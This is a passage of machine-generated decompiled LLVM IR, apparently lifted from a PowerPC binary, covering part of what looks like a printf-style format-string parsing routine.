dec_label_pc_10005710:                            ; preds = %dec_label_pc_10005704
  %v3_10005710 = icmp eq i8 %v2_10005704, 37
  br i1 %v3_10005710, label %dec_label_pc_10005718, label %dec_label_pc_10005704.backedge

dec_label_pc_10005718:                            ; preds = %dec_label_pc_10005710, %dec_label_pc_10005704
  %v4_10005718 = icmp eq i32 %v1_10005720, %v0_10005730
  br i1 %v4_10005718, label %dec_label_pc_1000574c, label %dec_label_pc_10005720

dec_label_pc_10005720:                            ; preds = %dec_label_pc_10005718
  %v2_10005720 = sub i32 %v1_10005720, %v0_10005730
  store i32 %v2_10005720, i32* @r31, align 4
  %v4_10005720 = icmp sgt i32 %v2_10005720, 0
  br i1 %v4_10005720, label %dec_label_pc_10005730, label %dec_label_pc_10005740

dec_label_pc_10005730:                            ; preds = %dec_label_pc_10005720
  %v0_10005738 = load i32, i32* %r24.global-to-local, align 4
  store i32 268457792, i32* @lr, align 4
  %v3_1000573c = inttoptr i32 %v0_10005738 to i16*
  %v4_1000573c = call i32 @function_100097d0(i32 %v0_10005730, i32 %v2_10005720, i16* %v3_1000573c)
  %v1_10005740.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005740

dec_label_pc_10005740:                            ; preds = %dec_label_pc_10005720, %dec_label_pc_10005730
  %v1_10005748 = phi i32 [ %v1_10005740.pre, %dec_label_pc_10005730 ], [ %v2_10005720, %dec_label_pc_10005720 ]
  %storemerge2 = phi i32 [ %v4_1000573c, %dec_label_pc_10005730 ], [ 0, %dec_label_pc_10005720 ]
  %v4_10005740 = icmp eq i32 %storemerge2, %v1_10005748
  br i1 %v4_10005740, label %dec_label_pc_10005748, label %dec_label_pc_10005ce8

dec_label_pc_10005748:                            ; preds = %dec_label_pc_10005740
  %v0_10005748 = load i32, i32* %r23.global-to-local, align 4
  %v2_10005748 = add i32 %v0_10005748, %v1_10005748
  store i32 %v2_10005748, i32* %r23.global-to-local, align 4
  %v0_1000574c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000574c

dec_label_pc_1000574c:                            ; preds = %dec_label_pc_10005718, %dec_label_pc_10005748
  %v0_10005758 = phi i32 [ %v0_10005730, %dec_label_pc_10005718 ], [ %v0_1000574c.pre, %dec_label_pc_10005748 ]
  %v1_1000574c = inttoptr i32 %v0_10005758 to i8*
  %v2_1000574c = load i8, i8* %v1_1000574c, align 1
  %v3_1000574c = zext i8 %v2_1000574c to i32
  store i32 %v3_1000574c, i32* %r0.global-to-local, align 4
  %v3_10005750 = icmp eq i8 %v2_1000574c, 0
  br i1 %v3_10005750, label %dec_label_pc_10005cec, label %dec_label_pc_10005758

dec_label_pc_10005758:                            ; preds = %dec_label_pc_1000574c
  %v1_10005758 = add i32 %v0_10005758, 1
  %v2_10005758 = inttoptr i32 %v1_10005758 to i8*
  %v3_10005758 = load i8, i8* %v2_10005758, align 1
  %v4_10005758 = zext i8 %v3_10005758 to i32
  store i32 %v4_10005758, i32* %r0.global-to-local, align 4
  %v3_10005760 = icmp eq i8 %v3_10005758, 37
  br i1 %v3_10005760, label %dec_label_pc_10005704.backedge, label %dec_label_pc_10005768

dec_label_pc_10005768:                            ; preds = %dec_label_pc_10005758
  store i32 %v2_100056a0, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_10005758, i8** %stack_var_-200, align 4
  store i32 268457856, i32* @lr, align 4
  %v3_1000577c = call i32 @function_100060cc(i32* %v1_100056b8, i32 %v1_10005758)
  store i32 %v2_100056a0, i32* @r3, align 4
  store i32 268457864, i32* @lr, align 4
  %v0_10005784 = call i32 @function_10005e1c()
  store i32 %v4_1000578c, i32* %r7.global-to-local, align 4
  store i32 %v2_10005794, i32* %r0.global-to-local, align 4
  br i1 %v2_10005790, label %dec_label_pc_100057a4, label %dec_label_pc_100057b0

dec_label_pc_100057a4:                            ; preds = %dec_label_pc_10005768
  br label %dec_label_pc_100057b0

dec_label_pc_100057b0:                            ; preds = %dec_label_pc_10005768, %dec_label_pc_100057a4
  %v0_100057dc82 = phi i32 [ %v1_100057ac, %dec_label_pc_100057a4 ], [ %v2_10005794, %dec_label_pc_10005768 ]
  store i32 %v0_100057dc82, i32* %r10.global-to-local, align 4
  store i32 %v2_100057b8, i32* %r8.global-to-local, align 4
  store i32 %v1_100057c0, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_100057e0.preheader, label %dec_label_pc_100057e0.preheader.thread

dec_label_pc_100057e0.preheader.thread:           ; preds = %dec_label_pc_100057b0
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100057ec

dec_label_pc_100057e0.preheader:                  ; preds = %dec_label_pc_100057b0
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_100057bc, label %dec_label_pc_100057ec, label %dec_label_pc_100057d8.preheader

dec_label_pc_100057d8.preheader:                  ; preds = %dec_label_pc_100057e0.preheader
  store i32 %v0_100057dc82, i32* %stack_var_-344, align 4
  %v1_100057dc83 = add i32 %v0_100057dc82, 8
  store i32 %v1_100057dc83, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_100057e888 = add i32 %tmp58, -1
  store i32 %v1_100057e888, i32* %ctr.global-to-local, align 4
  %v2_100057e889 = icmp eq i32 %v1_100057e888, 0
  br i1 %v2_100057e889, label %dec_label_pc_100057ec, label %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge

dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge: ; preds = %dec_label_pc_100057d8.preheader, %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge.dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge_crit_edge
  %v1_100057d8.pre = phi i32 [ %v1_100057d8.pre.pre, %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge.dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge_crit_edge ], [ %v2_100057b8, %dec_label_pc_100057d8.preheader ]
  %v1_100057e091 = phi i32 [ %v1_100057e0, %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge.dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge_crit_edge ], [ 4, %dec_label_pc_100057d8.preheader ]
  %v1_100057dc90 = phi i32 [ %v1_100057dc, %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge.dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge_crit_edge ], [ %v1_100057dc83, %dec_label_pc_100057d8.preheader ]
  %v3_100057d8 = add i32 %v1_100057d8.pre, %v1_100057e091
  %v4_100057d8 = inttoptr i32 %v3_100057d8 to i32*
  store i32 %v1_100057dc90, i32* %v4_100057d8, align 4
  %v0_100057dc = load i32, i32* %r10.global-to-local, align 4
  %v1_100057dc = add i32 %v0_100057dc, 8
  store i32 %v1_100057dc, i32* %r10.global-to-local, align 4
  %v0_100057e0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100057e0 = mul i32 %v0_100057e0, 4
  store i32 %v1_100057e0, i32* %r0.global-to-local, align 4
  %v1_100057e4 = add i32 %v0_100057e0, 1
  store i32 %v1_100057e4, i32* %r11.global-to-local, align 4
  %v0_100057e8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100057e8 = add i32 %v0_100057e8, -1
  store i32 %v1_100057e8, i32* %ctr.global-to-local, align 4
  %v2_100057e8 = icmp eq i32 %v1_100057e8, 0
  br i1 %v2_100057e8, label %dec_label_pc_100057ec, label %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge.dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge_crit_edge

dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge.dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge_crit_edge: ; preds = %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge
  %v1_100057d8.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge

dec_label_pc_100057ec:                            ; preds = %dec_label_pc_100057d8.preheader, %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge, %dec_label_pc_100057e0.preheader.thread, %dec_label_pc_100057e0.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_100057f0, label %dec_label_pc_100057f8, label %dec_label_pc_10005818

dec_label_pc_100057f8:                            ; preds = %dec_label_pc_100057ec
  %v0_100057fc = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_100057fc, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_100057fc, 0
  %v1_10005804 = zext i1 %tmp96 to i32
  %v2_10005804 = ashr i32 %v0_100057fc, 31
  %v3_10005804 = and i32 %v2_10005804, -2
  %v4_10005804 = or i32 %v3_10005804, %v1_10005804
  store i32 %v4_10005804, i32* @r5, align 4
  %v1_1000580c = call i32 @__asm_rlwinm(i32 %v0_1000592c, i32 0, i32 20, i32 23)
  store i32 %v1_1000580c, i32* @r4, align 4
  %v1_10005810 = inttoptr i32 %v1_1000580c to i16*
  %v2_10005810 = call i32 @function_10009ab4(i16* %v1_10005810)
  br label %dec_label_pc_10005cd4

dec_label_pc_10005818:                            ; preds = %dec_label_pc_100057ec
  br i1 %v2_10005818, label %dec_label_pc_100059f8, label %dec_label_pc_10005820

dec_label_pc_10005820:                            ; preds = %dec_label_pc_10005818
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_10005830 = load i8, i8* %v2_10005830, align 1
  %v4_10005830 = zext i8 %v3_10005830 to i32
  store i32 %v4_10005830, i32* %r30.global-to-local, align 4
  %v3_10005834 = icmp eq i8 %v3_10005830, 10
  br i1 %v3_10005834, label %dec_label_pc_1000583c, label %dec_label_pc_10005864

dec_label_pc_1000583c:                            ; preds = %dec_label_pc_10005820
  store i32 %v0_1000592c, i32* %r0.global-to-local, align 4
  %v1_10005840 = call i32 @__asm_rlwinm(i32 %v0_1000592c, i32 26, i32 31, i32 31)
  %v1_10005844 = call i32 @__asm_rlwinm(i32 %v0_1000592c, i32 27, i32 31, i32 31)
  %v3_10005848 = icmp eq i32 %v1_10005840, 0
  %v2_1000584c = icmp ne i32 %v1_10005844, 0
  %not.v2_1000584c = xor i1 %v2_1000584c, true
  %v6_10005850 = sext i1 %not.v2_1000584c to i32
  store i32 %v6_10005850, i32* %r0.global-to-local, align 4
  %v1_10005858 = select i1 %v2_1000584c, i32 44, i32 87
  store i32 %v1_10005858, i32* %r31.global-to-local, align 4
  br i1 %v3_10005848, label %dec_label_pc_10005864, label %dec_label_pc_10005860

dec_label_pc_10005860:                            ; preds = %dec_label_pc_1000583c
  %v1_10005860 = or i32 %v1_10005858, 128
  store i32 %v1_10005860, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005864

dec_label_pc_10005864:                            ; preds = %dec_label_pc_10005820, %dec_label_pc_1000583c, %dec_label_pc_10005860
  %v0_10005864 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005864 = icmp ugt i32 %v0_10005864, 5
  br i1 %v2_10005864, label %dec_label_pc_1000588c, label %dec_label_pc_1000586c

dec_label_pc_1000586c:                            ; preds = %dec_label_pc_10005864
  %v3_1000586c = icmp eq i32 %v0_10005864, 3
  br i1 %v3_1000586c, label %dec_label_pc_10005874, label %dec_label_pc_1000587c

dec_label_pc_10005874:                            ; preds = %dec_label_pc_1000586c
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005890

dec_label_pc_1000587c:                            ; preds = %dec_label_pc_1000586c
  %v3_1000587c = icmp eq i32 %v0_10005864, 1
  br i1 %v3_1000587c, label %dec_label_pc_10005894, label %dec_label_pc_10005890

dec_label_pc_1000588c:                            ; preds = %dec_label_pc_10005864
  %v0_1000588c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000588c = sub i32 0, %v0_1000588c
  store i32 %v1_1000588c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005890

dec_label_pc_10005890:                            ; preds = %dec_label_pc_1000587c, %dec_label_pc_10005874, %dec_label_pc_1000588c
  br label %dec_label_pc_10005894

dec_label_pc_10005894:                            ; preds = %dec_label_pc_1000587c, %dec_label_pc_10005890
  %storemerge3 = phi i32 [ 11, %dec_label_pc_10005890 ], [ 6, %dec_label_pc_1000587c ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_10005894 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10005894, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_10005894, -1
  br i1 %tmp75, label %dec_label_pc_100058a8, label %dec_label_pc_100058a4

dec_label_pc_100058a4:                            ; preds = %dec_label_pc_10005894
  br label %dec_label_pc_100058a8

dec_label_pc_100058a8:                            ; preds = %dec_label_pc_10005894, %dec_label_pc_100058a4
  %storemerge = phi i32 [ %v4_100058a4, %dec_label_pc_100058a4 ], [ 32, %dec_label_pc_10005894 ]
  store i32 %storemerge, i32* @r26, align 4
  %v3_100058a8 = icmp eq i32 %v0_10005864, 1
  br i1 %v3_100058a8, label %dec_label_pc_100058c4, label %dec_label_pc_100058b4

dec_label_pc_100058b4:                            ; preds = %dec_label_pc_100058a8
  %v0_100058b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_100058b4 = mul i32 %v0_100058b4, 4
  store i32 %v1_100058b4, i32* %r0.global-to-local, align 4
  %v0_100058b8 = load i32, i32* @r1, align 4
  %v2_100058b8 = add i32 %v0_100058b8, %v1_100058b4
  %v1_100058bc = add i32 %v2_100058b8, 188
  %v2_100058bc = inttoptr i32 %v1_100058bc to i32*
  %v3_100058bc = load i32, i32* %v2_100058bc, align 4
  store i32 %v3_100058bc, i32* %r0.global-to-local, align 4
  %v1_100058c0 = call i32 @__asm_rlwinm(i32 %v3_100058bc, i32 0, i32 20, i32 23)
  br label %dec_label_pc_100058c4

dec_label_pc_100058c4:                            ; preds = %dec_label_pc_100058a8, %dec_label_pc_100058b4
  %v3_100058c4 = load i32, i32* %stack_var_-344, align 4
  %v0_100058c8 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100058c8, i32* @r5, align 4
  %v2_100058cc = inttoptr i32 %v0_100058c8 to i32*
  %v3_100058cc = call i32 @function_10009a34(i32 %v3_100058c4, i32* %v2_100058cc)
  store i32 %v0_100058c8, i32* %r7.global-to-local, align 4
  %v0_100058dc = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_100058dc, i32* %r8.global-to-local, align 4
  %v6_100058e4 = call i32 @function_10009af0(i8* %v5_100058e4, i32 %v3_100058cc, i32 %v3_100058c4, i32 %v0_100058c8, i32 %v0_100058dc)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_100058e4, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_10005938, label %dec_label_pc_100058f8

dec_label_pc_100058f8:                            ; preds = %dec_label_pc_100058c4
  %v7_100058e4 = inttoptr i32 %v6_100058e4 to i8*
  %v3_100058f8 = load i8, i8* %v7_100058e4, align 1
  %v4_100058f8 = zext i8 %v3_100058f8 to i32
  store i32 %v4_100058f8, i32* %r0.global-to-local, align 4
  %v3_10005900 = icmp eq i8 %v3_100058f8, 45
  br i1 %v3_10005900, label %dec_label_pc_10005908, label %dec_label_pc_1000591c

dec_label_pc_10005908:                            ; preds = %dec_label_pc_100058f8
  %v1_10005908 = or i32 %v0_1000592c, 2
  store i32 %v1_10005908, i32* %r0.global-to-local, align 4
  %v2_1000590c = add i32 %v6_100058e4, 1
  store i32 %v2_1000590c, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_10005938

dec_label_pc_1000591c:                            ; preds = %dec_label_pc_100058f8
  %v1_1000591c = and i32 %v0_1000592c, 2
  store i32 %v1_1000591c, i32* %r0.global-to-local, align 4
  %v3_1000591c = icmp eq i32 %v1_1000591c, 0
  br i1 %v3_1000591c, label %dec_label_pc_1000592c, label %dec_label_pc_10005924

dec_label_pc_10005924:                            ; preds = %dec_label_pc_1000591c
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10005938

dec_label_pc_1000592c:                            ; preds = %dec_label_pc_1000591c
  %v1_1000592c = urem i32 %v0_1000592c, 2
  store i32 %v1_1000592c, i32* %r11.global-to-local, align 4
  %v3_1000592c = icmp eq i32 %v1_1000592c, 0
  br i1 %v3_1000592c, label %dec_label_pc_10005938, label %dec_label_pc_10005934

dec_label_pc_10005934:                            ; preds = %dec_label_pc_1000592c
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_10005938

dec_label_pc_10005938:                            ; preds = %dec_label_pc_1000592c, %dec_label_pc_100058c4, %dec_label_pc_10005924, %dec_label_pc_10005908, %dec_label_pc_10005934
  %v0_100059a4 = phi i32 [ %v6_100058e4, %dec_label_pc_100058c4 ], [ %v2_1000590c, %dec_label_pc_10005908 ], [ %v6_100058e4, %dec_label_pc_1000592c ], [ %v6_100058e4, %dec_label_pc_10005934 ], [ %v6_100058e4, %dec_label_pc_10005924 ]
  %stack_var_-184.0 = phi i32 [ %v0_1000592c, %dec_label_pc_100058c4 ], [ %v1_10005908, %dec_label_pc_10005908 ], [ %v0_1000592c, %dec_label_pc_1000592c ], [ %v0_1000592c, %dec_label_pc_10005934 ], [ %v0_1000592c, %dec_label_pc_10005924 ]
  %v3_10005938 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_10005b4c, i32* %r0.global-to-local, align 4
  %v2_10005940 = sub i32 %v2_10005b4c, %v0_100059a4
  %v1_10005948 = add i32 %v2_10005940, 127
  store i32 %v1_10005948, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_10005938, -1
  br i1 %tmp76, label %dec_label_pc_10005954, label %dec_label_pc_10005950

dec_label_pc_10005950:                            ; preds = %dec_label_pc_10005938
  br label %dec_label_pc_10005954

dec_label_pc_10005954:                            ; preds = %dec_label_pc_10005938, %dec_label_pc_10005950
  %v0_10005988 = phi i32 [ %v3_10005938, %dec_label_pc_10005938 ], [ 1, %dec_label_pc_10005950 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_10005958 = and i32 %stack_var_-184.0, 16
  store i32 %v1_10005958, i32* %r11.global-to-local, align 4
  %v3_10005958 = icmp eq i32 %v1_10005958, 0
  br i1 %v3_10005958, label %dec_label_pc_100059a4, label %dec_label_pc_10005960

dec_label_pc_10005960:                            ; preds = %dec_label_pc_10005954
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_10005964, label %dec_label_pc_10005970, label %dec_label_pc_10005980.thread

dec_label_pc_10005980.thread:                     ; preds = %dec_label_pc_10005960
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_100059a4

dec_label_pc_10005970:                            ; preds = %dec_label_pc_10005960
  br i1 %v3_10005970, label %dec_label_pc_10005978, label %dec_label_pc_10005980

dec_label_pc_10005978:                            ; preds = %dec_label_pc_10005970
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_100059a4

dec_label_pc_10005980:                            ; preds = %dec_label_pc_10005970
  br i1 %v3_10005980, label %dec_label_pc_10005988, label %dec_label_pc_100059a4

dec_label_pc_10005988:                            ; preds = %dec_label_pc_10005980
  %v3_10005988 = icmp ugt i32 %v0_10005988, %v1_10005948
  br i1 %v3_10005988, label %dec_label_pc_100059a4, label %dec_label_pc_10005990

dec_label_pc_10005990:                            ; preds = %dec_label_pc_10005988
  %v1_10005990 = inttoptr i32 %v0_100059a4 to i8*
  %v2_10005990 = load i8, i8* %v1_10005990, align 1
  %v3_10005990 = zext i8 %v2_10005990 to i32
  store i32 %v3_10005990, i32* %r0.global-to-local, align 4
  %v3_10005998 = icmp eq i8 %v2_10005990, 48
  br i1 %v3_10005998, label %dec_label_pc_100059a4, label %dec_label_pc_100059a0

dec_label_pc_100059a0:                            ; preds = %dec_label_pc_10005990
  %v1_100059a0 = add i32 %v2_10005940, 128
  br label %dec_label_pc_100059a4

dec_label_pc_100059a4:                            ; preds = %dec_label_pc_10005980.thread, %dec_label_pc_10005980, %dec_label_pc_10005990, %dec_label_pc_10005988, %dec_label_pc_10005954, %dec_label_pc_10005978, %dec_label_pc_100059a0
  %v1_100059ec = phi i32 [ %v0_10005988, %dec_label_pc_10005980 ], [ 1, %dec_label_pc_10005990 ], [ %v0_10005988, %dec_label_pc_10005988 ], [ %v0_10005988, %dec_label_pc_10005954 ], [ %v0_10005988, %dec_label_pc_10005978 ], [ %v1_100059a0, %dec_label_pc_100059a0 ], [ %v0_10005988, %dec_label_pc_10005980.thread ]
  %v1_100059a4 = inttoptr i32 %v0_100059a4 to i8*
  %v2_100059a4 = load i8, i8* %v1_100059a4, align 1
  %v3_100059a4 = zext i8 %v2_100059a4 to i32
  store i32 %v3_100059a4, i32* %r0.global-to-local, align 4
  %v3_100059a8 = icmp eq i8 %v2_100059a4, 48
  br i1 %v3_100059a8, label %dec_label_pc_100059b0, label %dec_label_pc_100059e8

dec_label_pc_100059b0:                            ; preds = %dec_label_pc_100059a4
  %v0_100059b0 = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_100059b0, 6
  br i1 %tmp77, label %dec_label_pc_100059bc, label %dec_label_pc_100059b8

dec_label_pc_100059b8:                            ; preds = %dec_label_pc_100059b0
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_100059bc

dec_label_pc_100059bc:                            ; preds = %dec_label_pc_100059b0, %dec_label_pc_100059b8
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_100059c0, label %dec_label_pc_100059c8, label %dec_label_pc_100059d8

dec_label_pc_100059c8:                            ; preds = %dec_label_pc_100059bc
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1000e054.224 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005b64

dec_label_pc_100059d8:                            ; preds = %dec_label_pc_100059bc
  %v3_100059d8 = icmp eq i32 %v1_100059ec, 0
  br i1 %v3_100059d8, label %dec_label_pc_100059e0, label %dec_label_pc_100059e8

dec_label_pc_100059e0:                            ; preds = %dec_label_pc_100059d8
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005b64

dec_label_pc_100059e8:                            ; preds = %dec_label_pc_100059d8, %dec_label_pc_100059a4
  %v3_100059e8 = icmp ugt i32 %v1_100059ec, %v1_10005948
  %v2_100059ec = sub i32 %v1_100059ec, %v1_10005948
  store i32 %v2_100059ec, i32* %r29.global-to-local, align 4
  br i1 %v3_100059e8, label %dec_label_pc_10005b84thread-pre-split, label %dec_label_pc_10005b64

dec_label_pc_100059f8:                            ; preds = %dec_label_pc_10005818
  br i1 %v2_100059f8, label %dec_label_pc_10005a2c, label %dec_label_pc_10005a00

dec_label_pc_10005a00:                            ; preds = %dec_label_pc_100059f8
  %v3_10005a00 = load i32, i32* %stack_var_-344, align 4
  %v0_10005a0c = load i32, i32* %r24.global-to-local, align 4
  store i32 268458524, i32* @lr, align 4
  %v5_10005a18 = call i32 @function_10009be8(i32 %v0_10005a0c, i32* nonnull %stack_var_-196, i32 268457460, i32 %v3_10005a00)
  %v1_10005a1c = icmp slt i32 %v5_10005a18, 0
  br i1 %v1_10005a1c, label %dec_label_pc_10005ce8, label %dec_label_pc_10005a24

dec_label_pc_10005a24:                            ; preds = %dec_label_pc_10005a00
  %v0_10005a24 = load i32, i32* %r23.global-to-local, align 4
  %v2_10005a24 = add i32 %v0_10005a24, %v5_10005a18
  store i32 %v2_10005a24, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10005cd4

dec_label_pc_10005a2c:                            ; preds = %dec_label_pc_100059f8
  br i1 %v2_10005a2c, label %dec_label_pc_10005ad4, label %dec_label_pc_10005a34

dec_label_pc_10005a34:                            ; preds = %dec_label_pc_10005a2c
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_10005a40 = load i32, i32* %stack_var_-344, align 4
  %v1_10005a48 = inttoptr i32 %v3_10005a40 to i32*
  %v2_10005a48 = load i32, i32* %v1_10005a48, align 4
  br i1 %v3_10005a2c, label %dec_label_pc_10005a48, label %dec_label_pc_10005a9c

dec_label_pc_10005a48:                            ; preds = %dec_label_pc_10005a34
  store i32 %v2_10005a48, i32* %r0.global-to-local, align 4
  %v3_10005a4c = icmp eq i32 %v2_10005a48, 0
  store i32 %v2_10005a48, i32* %stack_var_-340, align 4
  br i1 %v3_10005a4c, label %dec_label_pc_10005b6c, label %dec_label_pc_10005a58

dec_label_pc_10005a58:                            ; preds = %dec_label_pc_10005a48
  %v3_10005a58 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10005a58, i32* %r0.global-to-local, align 4
  %v1_10005a60 = icmp slt i32 %v3_10005a58, 0
  br i1 %v1_10005a60, label %dec_label_pc_10005a6c, label %dec_label_pc_10005a68

dec_label_pc_10005a68:                            ; preds = %dec_label_pc_10005a58
  br label %dec_label_pc_10005a6c

dec_label_pc_10005a6c:                            ; preds = %dec_label_pc_10005a58, %dec_label_pc_10005a68
  %storemerge94 = phi i32 [ %v3_10005a58, %dec_label_pc_10005a68 ], [ -1, %dec_label_pc_10005a58 ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_10005a6c, i32* @r3, align 4
  store i32 %v2_10005a70, i32* @r6, align 4
  store i32 %v2_10005a6c, i32* @r4, align 4
  store i32 268458620, i32* @lr, align 4
  %v0_10005a78 = call i32 @function_100095b0()
  %v3_10005a7c = icmp eq i32 %v0_10005a78, -1
  store i32 %v0_10005a78, i32* @r31, align 4
  br i1 %v3_10005a7c, label %dec_label_pc_10005ce8, label %dec_label_pc_10005a88

dec_label_pc_10005a88:                            ; preds = %dec_label_pc_10005a6c
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005b84

dec_label_pc_10005a9c:                            ; preds = %dec_label_pc_10005a34
  store i32 %v2_10005b4c, i32* @r28, align 4
  store i32 268458672, i32* @lr, align 4
  %v3_10005aac = call i32 @function_10009554(i32 %v2_10005b4c, i32 %v2_10005a48, i32 %v2_10005a70)
  %v3_10005ab0 = icmp eq i32 %v3_10005aac, -1
  store i32 %v3_10005aac, i32* @r31, align 4
  br i1 %v3_10005ab0, label %dec_label_pc_10005ce8, label %dec_label_pc_10005abc

dec_label_pc_10005abc:                            ; preds = %dec_label_pc_10005a9c
  store i32 %v2_10005b4c, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_10005acc = load i32, i32* @r25, align 4
  %v1_10005acc = load i32, i32* @r28, align 4
  %v3_10005acc = trunc i32 %v0_10005acc to i8
  %v4_10005acc = add i32 %v1_10005acc, %v3_10005aac
  %v5_10005acc = inttoptr i32 %v4_10005acc to i8*
  store i8 %v3_10005acc, i8* %v5_10005acc, align 1
  %v0_10005b88.pre.pre = load i32, i32* @r31, align 4
  %v1_10005b88.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10005b84thread-pre-split

dec_label_pc_10005ad4:                            ; preds = %dec_label_pc_10005a2c
  br i1 %v2_10005ad4, label %dec_label_pc_10005b40, label %dec_label_pc_10005adc

dec_label_pc_10005adc:                            ; preds = %dec_label_pc_10005ad4
  %v3_10005ae0 = load i32, i32* %stack_var_-344, align 4
  %v1_10005ae8 = inttoptr i32 %v3_10005ae0 to i32*
  %v2_10005ae8 = load i32, i32* %v1_10005ae8, align 4
  br i1 %v3_10005ad4, label %dec_label_pc_10005ae8, label %dec_label_pc_10005b18

dec_label_pc_10005ae8:                            ; preds = %dec_label_pc_10005adc
  store i32 %v2_10005ae8, i32* %r30.global-to-local, align 4
  %v3_10005aec = icmp eq i32 %v2_10005ae8, 0
  br i1 %v3_10005aec, label %dec_label_pc_10005b6c, label %dec_label_pc_10005af4

dec_label_pc_10005af4:                            ; preds = %dec_label_pc_10005ae8, %dec_label_pc_10005b48
  %v0_10005b08 = phi i32 [ %v2_10005ae8, %dec_label_pc_10005ae8 ], [ %v3_10005b58, %dec_label_pc_10005b48 ]
  %v3_10005af4 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10005af4, i32* %r0.global-to-local, align 4
  %v1_10005afc = icmp slt i32 %v3_10005af4, 0
  br i1 %v1_10005afc, label %dec_label_pc_10005b08, label %dec_label_pc_10005b04

dec_label_pc_10005b04:                            ; preds = %dec_label_pc_10005af4
  br label %dec_label_pc_10005b08

dec_label_pc_10005b08:                            ; preds = %dec_label_pc_10005af4, %dec_label_pc_10005b04
  %storemerge95 = phi i32 [ %v3_10005af4, %dec_label_pc_10005b04 ], [ -1, %dec_label_pc_10005af4 ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268458768, i32* @lr, align 4
  %v1_10005b0c = inttoptr i32 %v0_10005b08 to i8*
  %v2_10005b0c = call i32 @function_10007124(i8* %v1_10005b0c)
  store i32 %v2_10005b0c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005b78

dec_label_pc_10005b18:                            ; preds = %dec_label_pc_10005adc
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_10005ae8, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_10005b4c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005b84thread-pre-split

